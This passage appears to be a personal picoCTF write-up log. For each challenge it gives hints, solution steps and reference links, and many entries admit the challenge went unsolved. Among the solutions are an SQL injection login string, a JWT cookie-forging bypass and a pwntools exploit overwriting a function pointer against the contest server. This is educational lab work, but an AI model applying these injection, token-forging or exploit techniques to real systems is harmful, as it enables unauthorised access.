3. Type 10 and 170 in the input blank and hit 'ROCK!' to get your flag

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10243901

## Download Horsepower(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/SMaM4Z3.png)

### Hints
1. Learn how things are represented in memory
2. Try to make sure your exploit is resilient to differing offsets between objects
3. The V8 codebase changes often! Make sure you're accounting for any changes

### Solution by steps
Web shell keep loss conection today...

### Useful Stuffs
1. https://www.youtube.com/watch?v=Z-psAWvL6EY&ab_channel=MartinCarlisle

## corrupt-key-1(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/QJKC7b8.png)

### Hints
None

### Solution by steps
I have no idea after running `openssl rsa -text < private.key`

### Useful Stuffs
1. https://djm89uk.github.io/picogym_c.html#corrupt-key-1

## SaaS(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/ee80h3C.png)

### Hints
None

### Solution by steps
I'd try lots of ways to download Docker on webshell but it doesn't work ...

### Useful Stuffs
1. https://activities.tjhsst.edu/csc/writeups/picomini-redpwn-darin

## riscy business(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/wmoISeX.png)

### Hints
None

### Solution by steps
Uhhh... Yeah... I don't know how to solve this...

### Useful Stuffs
None

## Checkpass

## b00tl3gRSA2
![](https://i.imgur.com/DfmMg7i.png)

### Hints
1. What is e generally?

### Solution by steos
I can't download RsaCtfTool on Webshell...

### Useful Stuffs
1. https://github.com/RsaCtfTool/RsaCtfTool

## asm4
![](https://i.imgur.com/lGsvXsN.png)

### Hints
1. Treat the Array argument as a pointer

### Solution by steps
1. `wget` the file and run `strings test.S` to find out the number 
```sass
<+0>:   push   ebp
        <+1>:   mov    ebp,esp
        <+3>:   push   ebx
        <+4>:   sub    esp,0x10
        <+7>:   mov    DWORD PTR [ebp-0x10],0x246 <<< THIS_ONE
        <+14>:  mov    DWORD PTR [ebp-0xc],0x0
...
```
3. `vim solve.c` >>> `gcc -masm=intel -m32 solve.c -o solve` >>> `./solve`and get your flag
```c
 #include <stdio.h>
 #include <stdlib.h>

 int asm4(char* in)
 {
     int val;

     asm (
         "nop;"
         "nop;"
         "nop;"
         //"push   ebp;"
         //"mov    ebp,esp;"
         "push   ebx;"
         "sub    esp,0x10"
         "mov    DWORD PTR [ebp-0x10],THE_NUMBER_YOU_GOT"
         "mov    DWORD PTR [ebp-0xc],0x0"
         "jmp    _asm_27;"
     "_asm_23:"
         "add    DWORD PTR [ebp-0xc],0x1;"
     "_asm_27:"
         "mov    edx,DWORD PTR [ebp-0xc];"
         "mov    eax,DWORD PTR [%[pInput]];"
         "add    eax,edx;"
         "movzx  eax,BYTE PTR [eax];"
         "test   al,al;"
         "jne    _asm_23;"
         "mov    DWORD PTR [ebp-0x8],0x1;"
         "jmp    _asm_138;"
     "_asm_51:"
         "mov    edx,DWORD PTR [ebp-0x8];"
         "mov    eax,DWORD PTR [%[pInput]];"
         "add    eax,edx;"
         "movzx  eax,BYTE PTR [eax];"
         "movsx  edx,al;"
         "mov    eax,DWORD PTR [ebp-0x8];"
         "lea    ecx,[eax-0x1];"
         "mov    eax,DWORD PTR [%[pInput]];"
         "add    eax,ecx;"
         "movzx  eax,BYTE PTR [eax];"
         "movsx  eax,al;"
         "sub    edx,eax;"
         "mov    eax,edx;"
         "mov    edx,eax;"
         "mov    eax,DWORD PTR [ebp-0x10];"
         "lea    ebx,[edx+eax*1];"
         "mov    eax,DWORD PTR [ebp-0x8];"
         "lea    edx,[eax+0x1];"
         "mov    eax,DWORD PTR [%[pInput]];"
         "add    eax,edx;"
         "movzx  eax,BYTE PTR [eax];"
         "movsx  edx,al;"
         "mov    ecx,DWORD PTR [ebp-0x8];"
         "mov    eax,DWORD PTR [%[pInput]];"
         "add    eax,ecx;"
         "movzx  eax,BYTE PTR [eax];"
         "movsx  eax,al;"
         "sub    edx,eax;"
         "mov    eax,edx;"
         "add    eax,ebx;"
         "mov    DWORD PTR [ebp-0x10],eax;"
         "add    DWORD PTR [ebp-0x8],0x1;"
     "_asm_138:"
         "mov    eax,DWORD PTR [ebp-0xc];"
         "sub    eax,0x1;"
         "cmp    DWORD PTR [ebp-0x8],eax;"
         "jl     _asm_51;"
         "mov    eax,DWORD PTR [ebp-0x10];"
         "add    esp,0x10;"
         "pop    ebx;"
         //"pop    ebp;"
         //"ret    ;"
         "nop;"
         "nop;"
         "nop;"
             :"=r"(val)
             : [pInput] "m"(in)
     );

     return val;
 }

 int main(int argc, char** argv)
 {
     printf("0x%x\n", asm4("THE_STRING_QUESTION_GAVE"));

     return 0;
 }
```

### Useful Stuffs
1. https://picoctf2019.haydenhousen.com/reverse-engineering/asm4

## Irish-Name-Repo 3
![](https://i.imgur.com/qqSUJSz.png)

### Hints
1. Seems like the password is encrypted.

### Solution by steps
1. Press the link and login with ` ' <>1 <> '`

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10249326

## JaWT Scratchpad
![](https://i.imgur.com/xX7Q8Jx.png)

### Hints
1. What is that cookie?
2. Have you heard of JWT?

### Solution by steps
1. Press the link and input anything you like (except `admin`)
2. Copy the JWT value in cookie and use [JWT Debugger](https://jwt.io/) to change it to this
![](https://i.imgur.com/zRMEHAo.png)
3. Copy the result and paste it to the cookie 
4. Reload the webpage to get the flag

### Useful Stuffs
1. https://jwt.io/
2. https://ithelp.ithome.com.tw/articles/10250287

## Java Script Kiddie (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/hGqWU8e.png)

### Hints
1. This is only a JavaScript problem.

### Solution by steps
I'm still thinking how to solve this ...

### Useful Stuffs
1. https://ithelp.ithome.com.tw/articles/10250802
2. https://ctftime.org/task/9502

## Need For Speed
![](https://i.imgur.com/5US2aHV.png)

### Hints
1. What is the final key?

### Solution by steps
1. `wget` everything and run `chmod +x need-for-speed`
2. `gdb ./need-for-speed` and run `handle SIGALRM ignore`
3. Now run `r` to get your flag

### Useful Stuffs
1. https://github.com/HHousen/PicoCTF-2019/blob/master/Reverse%20Engineering/Need%20For%20Speed/README.md

## Investigative Reversing 4
![](https://i.imgur.com/r0kUgFS.png)

### Hints
None

### Solution by steps
1. `wget` all the stuffs and check the binary file with Ghidra
2. `vim solve.py` and run `python solve.py` to get the flag
```python
from pwn import *

bin_str = ""
for i in range(5, 0, -1):
    with open("Item0{}_cp.bmp".format(i), "rb") as b:
        b.seek(2019)
        
        for j in range(50):
            if ((j % 5) == 0):
                for k in range(8):
                    bin_str += str(ord(b.read(1)) & 1)
            else:
                b.read(1)

char_str = unbits(bin_str, endian = 'little')
print char_str
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_4.md

## B1ll_Gat35(SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/T8K6Ixw.png)

### Hints
1. Microsoft provides windows virtual machines https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
2. Ollydbg may be helpful
3. Flag format: PICOCTF{XXXX}

### Solution by steps
I can't run the exe file even though I'd run `chmod +x ./win-exec-1.exe` before execute it

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/B1ll_Gat35.md

## droids2
![](https://i.imgur.com/3CXGfzI.png)

### Hints
1. Try using apktool and an emulator
2. https://ibotpeaches.github.io/Apktool/
3. https://developer.android.com/studio

### Solution by steps
...Still not fix the VM/emulator problem on my laptop...

### Useful Stuffs
1. https://picoctf2019.haydenhousen.com/reverse-engineering/droids2

## vault-door-7
![](https://i.imgur.com/zmYWhYa.png)

### Hints
1. Use a decimal/hexadecimal converter such as this one: https://www.mathsisfun.com/binary-decimal-hexadecimal-converter.html
2. You will also need to consult an ASCII table such as this one: https://www.asciitable.com/

### Solution by steps
1. `wget` the file and `string VaultDoor7.java`, look at this part:
```java
    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        int[] x = passwordToIntArray(password);
        return x[0] == 1096770097
            && x[1] == 1952395366
            && x[2] == 1600270708
            && x[3] == 1601398833
            && x[4] == 1716808014
            && x[5] == 1734304867
            && x[6] == 942695730
            && x[7] == 942748212;
    }
```
2. Run `python` and
```bash
>>> from pwn import *
>>> a = [1096770097, 1952395366, 1600270708, 1601398833, 1716808014, 1734304867, 942695730, 942748212]
>>> print (b"".join(p32(x, endian='big') for x in a))
b'A_b1t_0f_b1t_sh1fTiNg_dc80e28124'
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/vault-door-7.md
2. https://stackoverflow.com/questions/32071536/typeerror-sequence-item-0-expected-str-instance-bytes-found

## AES-ABC
![](https://i.imgur.com/LYyYTfY.png)

### Hints
1. You probably want to figure out what the flag looks like in ECB form...

### Solution by steps
1. `wget` all the stuffs and realize how `strings aes-abc.py` encrypts
2. `vim solve..py` and run it to get `flag.ppm`:
```python
from Crypto.Util.number import long_to_bytes
import math
BLOCK_SIZE = 16
UMAX = int(math.pow(256, BLOCK_SIZE))

f = open("body.enc.ppm", "rb")
h1 = f.readline()
h2 = f.readline()
h3 = f.readline()

xs = []
while True:
    data = int.from_bytes(f.read(16), "big")
    if data == 0:
        break
    xs.append(data)
ys = []
for i in range(1, len(xs)):
    y = (xs[i] - xs[i - 1]) % UMAX
    # if y < 0:
    #     y += int(pow(256, 16))
    y = long_to_bytes(y)
    # while len(y) % 16 != 0:
    #     y = b"\0" + y
    ys.append(y)
with open("flag.ppm", "wb") as f2:
    f2.write(h1)
    f2.write(h2)
    f2.write(h3)
    f2.write(b"".join(ys))
```
3. Drag the ppm file to [PPM to PDF Converter](https://cloudconvert.com/ppm-to-pdf) to get the flag

### Useful Stuffs
1. https://ctf.samsongama.com/ctf/crypto/picoctf19-aesabc.html
2. https://cloudconvert.com/ppm-to-pdf

## Investigative Reversing 3
![](https://i.imgur.com/s6XYDIn.png)

### Hints
1. You will want to reverse how the LSB encoding works on this problem

### Solution by steps
1. `wget` all the files and open the binary one with Ghidra
2. `xxd -g 1 -s $((0x2d3 - 32)) -l $((50*8 + 48 + 64)) encoded.bmp` to look the details
3. `vim solve.py` and run `python solve.py` to get the flag
```python
from pwn import *

with open("encoded.bmp", "rb") as b:
    b.seek(0x2d3)
    bin_str = ""
    for j in range(100):
        if ((j & 1) == 0):
            for k in range(8):
                bin_str += str(ord(b.read(1)) & 1)
        else:
            b.read(1)

char_str = unbits(bin_str, endian = 'little')
print (char_str)
```

### Useful Stuffs
1. https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Investigative_Reversing_3.md

## The Office
![](https://i.imgur.com/BNVP2rO.png)

### Hints
1. The heapcheck function contains a lot of useful debugging info. See if you can get it to work.

### Solution by tseps
Yeah... The webshell terminated every time I tried to run it

### Useful Stuffs
1. https://ctftime.org/writeup/29364

## homework
![](https://i.imgur.com/odNGaNW.png)

### Hints
None

### Solution by steps
No any idea to solve this

### Useful Stuffs
None

## function overwrite
![](https://i.imgur.com/Uw5hUEd.png)

### Hints
1. Don't be so negative

### Solution by steps
1. `wget` all the files and `strings vuln.c`
2. `vim solve.py` and run `python solve.py` to get the flag
```python
from pwn import *

elf = ELF('./vuln')

if args.REMOTE:
    p = remote('saturn.picoctf.net', 55486)
else:
    p = process(elf.path)

story_buffer = "~"*10+"M" # =1337

p.sendlineafter('>>', story_buffer)
print(p.recvuntil('10'))
p.sendline('-16 -314') # num1=-16 to access to check from fun pointer, -314 is the offset between hard_checker to easy_checker
p.interactive()
```

### Useful Stuffs
1. https://github.com/evyatar9/Writeups/tree/master/CTFs/2022-picoCTF2022/Binary_Exploitation/400-function_overwrite

## Keygenme (SUPER_DUPER_SUPER_DUPER_HARD)
![](https://i.imgur.com/TbhusY6.png)

### Hints
None

### Solution by steps
...Binary files can't run with full access on webshell

### Useful Stuffs
1. https://github.com/evyatar9/Writeups/tree/master/CTFs/2022-picoCTF2022/Reverse_Engineering/400-Keygenme

## Operation Orchid
![](https://i.imgur.com/xX1Ste8.png)

### Hints
None

### Solution by steps
1. `wget` all the stuffs and `gunzip disk.flag.img.gz`
2. `strings -t d disk.flag.img | grep -iE "flag.txt"`,`strings -t d disk.flag.img | grep -iE "Salted"`
3. `expr 221247488 - 210763776`,`expr 10483712 / 1024`
4. `ifind -f ext4 -o 411648 -d 10238 disk.flag.img`, `icat -f ext4 -o 411648 disk.flag.img 1782`
5. `icat -f ext4 -o 411648 disk.flag.img 1782 > flag.txt.enc` and run `openssl aes256 -d -salt -in flag.txt.enc -out flag.txt -k unbreakablepassword1234567` to get the flag

### Useful Stuffs
1. https://github.com/LambdaMamba/CTFwriteups/tree/main/picoCTF_2022/Forensics/Operation_Orchid



